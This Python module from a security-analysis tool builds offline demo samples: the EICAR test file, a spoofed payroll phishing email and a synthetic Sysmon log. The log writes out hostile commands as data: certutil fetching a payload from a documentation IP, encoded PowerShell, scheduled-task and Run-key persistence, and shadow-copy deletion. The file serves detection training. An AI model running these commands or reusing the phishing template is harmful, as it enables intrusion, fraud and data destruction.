"""Sample files built into SO-CRATES, for the Welcome screen's sample
buttons that work with no internet access (POST /api/load-sample).

Each sample is generated on request, not shipped as a file. The binary
and email samples carry the EICAR antivirus test string (the binary
sample is just that file), and building them here - with the string
split in this source - means no file in the container image contains the
signature for a scanner to flag or quarantine. It only exists in full in
an analysis directory once someone loads a sample.

All three use only reserved .example domains and documentation-range IPs
(RFC 2606, RFC 5737), and tell one story: the email lands, Jordan opens
the attachment, and the log is what happened on the workstation next.

Samples are byte-for-byte deterministic, so loading one twice reopens the
same analysis (same MD5) instead of creating another.
"""

import json
from email.message import EmailMessage
from email.policy import SMTP

# The EICAR test string - a harmless file antivirus and YARA rulesets flag
# by design - in two halves, so this file itself never matches.
EICAR = b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$' + b'EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'


def _fix_boundaries(msg, prefix):
    """Give every multipart part a fixed boundary - left unset, the email
    package picks a random one each time the message is generated."""
    for i, part in enumerate(msg.walk()):
        if part.is_multipart():
            part.set_boundary(f'=={prefix}-{i}==')


def build_email_sample():
    """A phishing message that exercises every part of email analysis: a
    spoofed sender with a Reply-To and Return-Path elsewhere, failing SPF
    and DMARC, a link whose text names a different domain than it goes
    to, an executable attachment (the EICAR test file) and a forwarded
    message. Only reserved .example domains and documentation-range IPs
    (RFC 2606, RFC 5737), so nothing in it points at a real organization."""
    earlier = EmailMessage()
    earlier['Date'] = 'Mon, 02 Feb 2026 16:12:09 +0000'
    earlier['From'] = '"Northbridge Payroll" <noreply@northbridgepay.example>'
    earlier['To'] = 'jordan.lee@corp.example'
    earlier['Subject'] = 'Payroll schedule update'
    earlier['Message-ID'] = '<sched-0202@northbridgepay.example>'
    earlier.set_content(
        'Hello,\n\n'
        'Starting next month, payroll adjustments must be confirmed in the\n'
        'employee portal: https://portal.northbridgepay.example/schedule\n\n'
        'Northbridge Payroll\n')

    msg = EmailMessage()
    msg['Received'] = ('from mx1.corp.example (mx1.corp.example [10.20.0.5]) '
                       'by mail.corp.example with ESMTPS; Tue, 03 Feb 2026 08:41:17 +0000')
    msg['Received'] = ('from smtp.northbridge-secure.example (smtp.northbridge-secure.example [203.0.113.66]) '
                       'by mx1.corp.example with ESMTP; Tue, 03 Feb 2026 08:41:15 +0000')
    msg['Authentication-Results'] = ('mx1.corp.example; spf=fail smtp.mailfrom=northbridgepay.example; '
                                     'dkim=none; dmarc=fail header.from=northbridgepay.example')
    msg['Return-Path'] = '<bounce-7731@mailer.northbridge-secure.example>'
    msg['Date'] = 'Tue, 03 Feb 2026 08:41:12 +0000'
    msg['From'] = '"Northbridge Payroll" <payroll@northbridgepay.example>'
    msg['Reply-To'] = 'payroll-support@northbridge-secure.example'
    msg['To'] = '"Jordan Lee" <jordan.lee@corp.example>'
    msg['Subject'] = 'ACTION REQUIRED: Confirm your direct deposit by end of day'
    msg['Message-ID'] = '<20260203084112.7731@mailer.northbridge-secure.example>'
    msg['X-Mailer'] = 'PHPMailer 6.1.4'

    msg.set_content(
        'Dear Jordan,\n\n'
        'Your February direct deposit is on hold. To avoid a delay in your pay,\n'
        'confirm your bank details today at https://portal.northbridgepay.example/login\n\n'
        'You can also complete the attached Payroll Adjustment form.\n'
        "We've attached our earlier notice for reference.\n\n"
        'Northbridge Payroll Services\n')
    msg.add_alternative(
        '<html><body style="font-family: Arial, sans-serif;">'
        '<p>Dear Jordan,</p>'
        '<p>Your February direct deposit is <b>on hold</b>. To avoid a delay in your pay, '
        'confirm your bank details today:</p>'
        '<p><a href="https://northbridgepay.example.account-verify.example/session?id=7731">'
        'https://portal.northbridgepay.example/login</a></p>'
        '<p>You can also complete the attached Payroll Adjustment form. '
        "We've attached our earlier notice for reference.</p>"
        '<p>Questions? Visit our <a href="https://help.northbridgepay.example/payroll">Help Center</a>.</p>'
        '<p>Northbridge Payroll Services</p>'
        '</body></html>', subtype='html')
    msg.add_attachment(EICAR, maintype='application', subtype='octet-stream',
                       filename='Payroll_Adjustment_Form.exe')
    msg.add_attachment(earlier)
    _fix_boundaries(msg, 'SO-CRATES-sample')
    return msg.as_bytes(policy=SMTP)


def build_binary_sample():
    """The EICAR test file - byte-for-byte what eicar.org serves as
    eicar.com, which the Sample binary file used to download (so an
    existing analysis of it is reopened, not duplicated)."""
    return EICAR


_SYSMON = {'Channel': 'Microsoft-Windows-Sysmon/Operational', 'Provider_Name': 'Microsoft-Windows-Sysmon',
           'Computer': 'FIN-WS-0412.corp.example'}
_WORD = 'C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE'
_POWERSHELL = 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
_CMD = 'C:\\Windows\\System32\\cmd.exe'
_DROPPED = 'C:\\Users\\Public\\update.exe'


def _process(time, pid, image, command_line, parent_pid, parent_image, parent_command_line,
             user='CORP\\jordan.lee'):
    """A Sysmon process-creation event (ID 1)."""
    return dict(_SYSMON, EventID=1, SystemTime=time, ProcessId=pid, Image=image,
                OriginalFileName=image.rsplit('\\', 1)[-1].upper(), CommandLine=command_line,
                ParentProcessId=parent_pid, ParentImage=parent_image,
                ParentCommandLine=parent_command_line, User=user, IntegrityLevel='Medium')


def build_log_sample():
    """Sysmon events, one JSON object per line, from the workstation that
    opened the sample email's payroll form: Word starts encoded PowerShell,
    certutil downloads a payload from the email's originating IP, and the
    payload enumerates the user, persists (scheduled task and Run key) and
    deletes shadow copies. Built to fire long-standing SigmaHQ rules -
    18 alerts, high to low, with the built-in ruleset when written."""
    events = [
        _process('2026-02-03T08:44:02.118Z', 6120, _WORD,
                 '"WINWORD.EXE" /n "C:\\Users\\jordan.lee\\Downloads\\Payroll_Adjustment_Form.docm"',
                 3312, 'C:\\Windows\\explorer.exe', 'C:\\Windows\\Explorer.EXE'),
        _process('2026-02-03T08:44:19.540Z', 7044, _POWERSHELL,
                 'powershell.exe -nop -w hidden -enc '
                 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA',
                 6120, _WORD, '"WINWORD.EXE" /n "Payroll_Adjustment_Form.docm"'),
        _process('2026-02-03T08:44:31.007Z', 7208, 'C:\\Windows\\System32\\certutil.exe',
                 f'certutil.exe -urlcache -split -f http://203.0.113.66/update.bin {_DROPPED}',
                 7044, _POWERSHELL, 'powershell.exe -nop -w hidden -enc SQBFAFgA...'),
        dict(_SYSMON, EventID=3, SystemTime='2026-02-03T08:44:31.412Z', ProcessId=7208,
             Image='C:\\Windows\\System32\\certutil.exe', User='CORP\\jordan.lee', Protocol='tcp',
             Initiated='true', SourceIp='10.20.4.12', SourcePort=51733,
             DestinationIp='203.0.113.66', DestinationPort=80),
        _process('2026-02-03T08:45:02.690Z', 7390, 'C:\\Windows\\System32\\whoami.exe', 'whoami /all',
                 7372, _CMD, 'cmd.exe /c whoami /all'),
        _process('2026-02-03T08:45:20.233Z', 7466, 'C:\\Windows\\System32\\schtasks.exe',
                 f'schtasks /create /sc onlogon /tn "Payroll Updater" /tr {_DROPPED} /f',
                 7450, _CMD, 'cmd.exe /c schtasks /create /sc onlogon /tn "Payroll Updater"'),
        dict(_SYSMON, EventID=13, SystemTime='2026-02-03T08:45:25.871Z', EventType='SetValue',
             ProcessId=7302, Image=_DROPPED, User='CORP\\jordan.lee',
             TargetObject='HKU\\S-1-5-21-3623811015-3361044348-30300820-1013\\Software\\Microsoft'
                          '\\Windows\\CurrentVersion\\Run\\PayrollUpdater',
             Details=_DROPPED),
        _process('2026-02-03T08:45:41.059Z', 7584, 'C:\\Windows\\System32\\vssadmin.exe',
                 'vssadmin.exe delete shadows /all /quiet', 7302, _DROPPED, _DROPPED),
    ]
    return ''.join(json.dumps(e, sort_keys=True) + '\n' for e in events).encode()


# name -> (filename the analysis is given, builder). The only names
# POST /api/load-sample accepts.
SAMPLES = {
    'binary': ('eicar.com', build_binary_sample),
    'log': ('sample-sysmon-log.json', build_log_sample),
    'email': ('sample-phishing-email.eml', build_email_sample),
}
